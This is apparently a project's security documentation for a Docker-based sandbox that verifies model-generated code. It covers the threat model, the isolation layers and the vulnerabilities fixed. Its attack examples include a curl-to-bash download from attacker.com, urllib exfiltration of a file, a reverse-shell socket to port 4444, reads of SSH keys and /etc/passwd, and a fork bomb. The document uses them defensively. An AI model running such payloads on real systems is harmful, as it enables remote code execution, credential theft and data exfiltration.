# Security Documentation

Version: 0.2.0
Last Updated: 2025-11-20

## Table of Contents

- [Security Overview](#security-overview)
- [Threat Model](#threat-model)
- [Security Architecture](#security-architecture)
- [Vulnerabilities Addressed](#vulnerabilities-addressed)
- [Security Features](#security-features)
- [Best Practices](#best-practices)
- [Security Testing](#security-testing)
- [Incident Response](#incident-response)
- [Known Limitations](#known-limitations)

## Security Overview

The enhanced verification system eliminates the **critical code injection vulnerabilities** present in the original implementation by using Docker-based sandboxing instead of `exec()`/`eval()` in the main process.

### Security Principles

1. **Defense in Depth**: Multiple layers of security controls
2. **Least Privilege**: Containers run as non-root with minimal capabilities
3. **Isolation**: Complete separation between verification and execution
4. **Resource Limits**: DoS prevention through resource quotas
5. **Input Validation**: All inputs sanitized and size-limited

### Security Comparison

| Feature | Original System | Enhanced System |
|---------|----------------|-----------------|
| Code Execution | ❌ Direct exec() | ✅ Docker isolation |
| Network Access | ❌ Unrestricted | ✅ Disabled |
| Filesystem Access | ❌ Full access | ✅ Read-only + /tmp |
| Resource Limits | ❌ None | ✅ CPU, Memory, Timeout |
| User Privileges | ❌ Same as parent | ✅ Non-root user |
| Input Validation | ⚠️ Partial | ✅ Comprehensive |

## Threat Model

### Assets to Protect

1. **Host system**: Files, processes, credentials
2. **Network**: Internal and external resources
3. **Data**: User inputs, ground truth, results
4. **Availability**: System uptime and performance

### Threat Actors

1. **Malicious model outputs**: LLM generates harmful code
2. **Compromised datasets**: Injected malicious ground truth
3. **Supply chain attacks**: Compromised dependencies
4. **Insider threats**: Intentional misuse

### Attack Vectors

1. **Code injection**: Arbitrary code execution
2. **Command injection**: Shell command manipulation
3. **Path traversal**: Unauthorized file access
4. **Resource exhaustion**: DoS attacks
5. **Container escape**: Breaking isolation
6. **Data exfiltration**: Leaking sensitive information

## Security Architecture

### Layered Defense

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Input Validation                                   │
│ - Size limits (max_json_size, max_expression_size)         │
│ - Format validation (JSON, regex patterns)                  │
│ - Sanitization (escape sequences, null bytes)               │
└─────────────────────────────────────────────────────────────┘
                             ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 2: Process Isolation (Docker)                         │
│ - Separate container per execution                          │
│ - No shared state between executions                        │
│ - Container-level resource limits                           │
└─────────────────────────────────────────────────────────────┘
                             ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 3: Network Isolation                                  │
│ - network_mode="none" (no network access)                   │
│ - Cannot connect to external services                       │
│ - Cannot scan internal network                              │
└─────────────────────────────────────────────────────────────┘
                             ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 4: Filesystem Protection                              │
│ - Read-only root filesystem                                 │
│ - Writable /tmp (tmpfs, noexec, size-limited)              │
│ - No access to host filesystem                              │
└─────────────────────────────────────────────────────────────┘
                             ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 5: Capability Dropping                                │
│ - cap_drop=['ALL'] (drop all Linux capabilities)           │
│ - security_opt=['no-new-privileges']                       │
│ - Run as non-root user (UID 1000)                          │
└─────────────────────────────────────────────────────────────┘
                             ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 6: Resource Limits                                    │
│ - CPU limit (default: 2 cores)                             │
│ - Memory limit (default: 512MB)                            │
│ - Execution timeout (default: 5 seconds)                   │
│ - Output size limit (default: 10000 chars)                 │
└─────────────────────────────────────────────────────────────┘
```

## Vulnerabilities Addressed

### 1. Arbitrary Code Execution (CRITICAL)

**Original Vulnerability:**
```python
# DANGEROUS - Original code
exec(code, {"__builtins__": __builtins__, "math": math})
```

**Attack Example:**
```python
# Attacker payload
code = "__import__('os').system('curl attacker.com/steal.sh | bash')"
```

**Fix:**
```python
# Safe - Enhanced system
sandbox = DockerSandbox(config)
result = sandbox.execute(code, language='python')
# Code runs in isolated container with no network access
```

**Impact:** Complete system compromise → Fully isolated execution

### 2. Resource Exhaustion (HIGH)

**Original Vulnerability:**
```python
# No timeout, no resource limits
exec(code)  # Can run forever, consume unlimited memory
```

**Attack Example:**
```python
# Fork bomb
code = "import os; [os.fork() for _ in iter(int, 1)]"

# Memory bomb
code = "x = 'A' * (10**9)"

# Infinite loop
code = "while True: pass"
```

**Fix:**
```python
# Resource limits enforced by Docker
container = self.client.containers.create(
    mem_limit="512m",              # Memory limit
    nano_cpus=int(2.0 * 1e9),     # CPU limit (2 cores)
    # Plus execution timeout in code
)
```

**Impact:** DoS attacks → Resource-limited execution

### 3. File System Access (HIGH)

**Original Vulnerability:**
```python
# Code can access any file
exec("open('/etc/passwd').read()")
```

**Attack Example:**
```python
# Read credentials
code = "print(open('/home/user/.ssh/id_rsa').read())"

# Write malware
code = "open('/tmp/malware', 'w').write(malicious_payload)"
```

**Fix:**
```python
# Read-only root filesystem
container = self.client.containers.create(
    read_only=True,
    tmpfs={'/tmp': 'rw,noexec,nosuid,size=100m'},
)
# Cannot access host files, /tmp is ephemeral and non-executable
```

**Impact:** Data exfiltration → No access to host files

### 4. Network Access (HIGH)

**Original Vulnerability:**
```python
# Code can make network requests
exec("import urllib; urllib.request.urlopen('http://attacker.com/exfil')")
```

**Attack Example:**
```python
# Data exfiltration
code = """
import urllib.request
data = open('/etc/hosts').read()
urllib.request.urlopen('http://attacker.com/exfil', data=data)
"""

# C2 communication
code = """
import socket
s = socket.socket()
s.connect(('attacker.com', 4444))
# Reverse shell...
"""
```

**Fix:**
```python
# Network completely disabled
container = self.client.containers.create(
    network_mode="none",  # No network interface at all
)
```

**Impact:** Data exfiltration / C2 → Complete network isolation

### 5. Privilege Escalation (MEDIUM)

**Original Vulnerability:**
```python
# Code runs with same privileges as parent process
exec(code)  # If parent is root, code is root
```

**Attack Example:**
```python
# Exploit setuid binaries
code = "os.system('sudo su -')"
```

**Fix:**
```python
# Non-root user, no capabilities, no setuid binaries
container = self.client.containers.create(
    user='1000:1000',  # Non-root user
    security_opt=['no-new-privileges'],
    cap_drop=['ALL'],  # Drop all capabilities
)
# All setuid binaries stripped in Dockerfile
```

**Impact:** Privilege escalation → Unprivileged execution only

## Security Features

### Docker Sandbox Configuration

```python
# From docker_sandbox.py:_create_container()
container = self.client.containers.create(
    image=self.image,
    command="tail -f /dev/null",
    detach=True,

    # Resource limits
    mem_limit=self.memory_limit,        # "512m"
    nano_cpus=int(self.cpu_limit * 1e9),  # 2.0 cores

    # Network isolation
    network_mode="none",                 # No network

    # Filesystem protection
    read_only=True,                     # Read-only root FS
    tmpfs={'/tmp': 'rw,noexec,nosuid,size=100m'},

    # Security options
    security_opt=['no-new-privileges'], # Prevent privilege escalation
    cap_drop=['ALL'],                   # Drop all capabilities
    user='1000:1000',                   # Non-root user
)
```

### Input Validation

**Size Limits:**
```python
# Math verifier
max_expression_size = 10000  # Prevent huge expressions

# Code verifier
max_output_size = 10000  # Prevent memory exhaustion

# Tool verifier
max_json_size = 100000  # Prevent JSON bombs
```

**Format Validation:**
```python
# Only valid JSON accepted by tool verifier
try:
    json.loads(json_str)
except json.JSONDecodeError:
    return VerificationResult.failure("Invalid JSON")
```

### Timeout Enforcement

```python
# Base class: timeout_context()
with timeout_context(self.timeout):
    result = self._verify_impl(question, candidate, spec)
# Raises TimeoutError if exceeded
```

### Container Lifecycle Management

```python
# Automatic cleanup
def cleanup(self):
    """Clean up all containers."""
    while not self._pool.empty():
        container = self._pool.get_nowait()
        container.remove(force=True)
```

## Best Practices

### For Developers

1. **Never use exec/eval**: Always use Docker sandbox for code execution
2. **Validate all inputs**: Check size, format, and content before processing
3. **Set resource limits**: Always configure timeouts, memory, and CPU limits
4. **Use latest Docker image**: Keep security patches up to date
5. **Audit configuration**: Regularly review security settings
6. **Log security events**: Track suspicious activities

### For Operators

1. **Keep Docker updated**: `docker --version` >= 24.0
2. **Monitor container metrics**: Use `docker stats` to track resource usage
3. **Limit pool size**: Don't exceed 10 warm containers
4. **Review logs regularly**: Check for timeout/error patterns
5. **Test disaster recovery**: Practice incident response procedures
6. **Restrict Docker socket**: Only trusted users should access Docker

### For Users

1. **Don't disable security**: Keep `network_disabled=True`, `read_only=True`
2. **Use reasonable timeouts**: 5-10 seconds for most code
3. **Review generated code**: Inspect before verification if possible
4. **Report suspicious behavior**: Alert security team if verifier acts unexpectedly

## Security Testing

### Penetration Testing Checklist

- [ ] **Code Injection**: Try executing shell commands
- [ ] **Path Traversal**: Try accessing `/etc/passwd`, `/proc/self`
- [ ] **Network Access**: Try connecting to external services
- [ ] **Fork Bomb**: Try `os.fork()` or `subprocess.Popen()` in loop
- [ ] **Memory Exhaustion**: Try allocating huge strings/lists
- [ ] **CPU Exhaustion**: Try infinite loops
- [ ] **File Writing**: Try creating files in `/tmp`, `/`, `/home`
- [ ] **Privilege Escalation**: Try `sudo`, `su`, setuid binaries
- [ ] **Container Escape**: Try Docker socket access, kernel exploits

### Test Commands

```bash
# Test network isolation
python -c "
verifier = get_verifier('code')
result = verifier.verify(
    'test',
    {'text': 'import urllib.request; urllib.request.urlopen(\"http://example.com\")'},
    {}
)
assert not result.is_correct  # Should fail
"

# Test filesystem isolation
python -c "
verifier = get_verifier('code')
result = verifier.verify(
    'test',
    {'text': 'open(\"/etc/passwd\").read()'},
    {}
)
assert not result.is_correct  # Should fail
"

# Test resource limits
python -c "
import time
verifier = get_verifier('code', {'timeout': 1.0})
start = time.time()
result = verifier.verify(
    'test',
    {'text': 'import time; time.sleep(10)'},
    {}
)
elapsed = time.time() - start
assert elapsed < 2.0  # Should timeout quickly
"
```

### Automated Security Scanning

```bash
# Scan Docker image for vulnerabilities
docker scan nexus-code-verifier:latest

# Check container configuration
docker inspect nexus-code-verifier:latest | jq '.Config.User'
# Should output: "1000:1000"

# Verify network isolation
docker inspect <container_id> | jq '.NetworkSettings.Networks'
# Should be empty
```

## Incident Response

### If Code Execution Vulnerability Found

1. **Immediate**: Disable affected verifier
2. **Within 1 hour**: Apply fix or implement workaround
3. **Within 24 hours**: Update all deployments
4. **Within 1 week**: Conduct post-mortem, update documentation

### If Container Escape Detected

1. **Immediate**: Stop all verification, isolate affected systems
2. **Within 1 hour**: Assess scope of compromise
3. **Within 4 hours**: Contain and eradicate threat
4. **Within 24 hours**: Restore services with patched systems
5. **Within 1 week**: Complete forensic analysis

### Reporting Security Issues

- Email: security@nexus-project.org (if applicable)
- GitHub: Create private security advisory
- Include: Reproduction steps, impact assessment, suggested fix

## Known Limitations

### Docker Daemon Access

**Risk**: If main process has access to Docker socket, container escape is possible.

**Mitigation**:
- Don't mount Docker socket in containers
- Use rootless Docker where possible
- Restrict Docker daemon access to trusted users

### Kernel Vulnerabilities

**Risk**: Container isolation relies on Linux kernel features (cgroups, namespaces). Kernel exploits could escape container.

**Mitigation**:
- Keep kernel updated (Linux 5.10+)
- Use gVisor runtime for additional isolation (optional)
- Monitor for kernel security advisories

### Resource Limits on Windows

**Risk**: Some resource limits (CPU, memory) may not work on Windows Docker Desktop.

**Mitigation**:
- Use Linux (native or WSL2) for production
- Test resource limits on target platform
- Implement application-level timeouts as backup

### Side-Channel Attacks

**Risk**: Timing attacks, cache attacks may leak information between containers.

**Mitigation**:
- Accept as residual risk (low severity for this use case)
- Consider dedicated hardware for sensitive workloads
- Use gVisor if necessary

## Security Audit History

| Date | Auditor | Findings | Status |
|------|---------|----------|--------|
| 2025-11-20 | Internal | Initial security review | Complete |
| TBD | External | Professional penetration test | Planned |

## References

- Docker Security Best Practices: https://docs.docker.com/engine/security/
- OWASP Docker Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
- CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker
- Linux Container Security: https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html

## Compliance

This implementation follows:
- OWASP Top 10 mitigation strategies
- CIS Docker Benchmark Level 1
- Principle of Least Privilege (PoLP)
- Defense in Depth architecture

## Conclusion

The enhanced verification system provides **production-grade security** by:
1. Eliminating arbitrary code execution in the main process
2. Implementing multiple layers of isolation and defense
3. Enforcing strict resource limits
4. Following security best practices and industry standards

**The original system's critical vulnerabilities have been completely eliminated.**
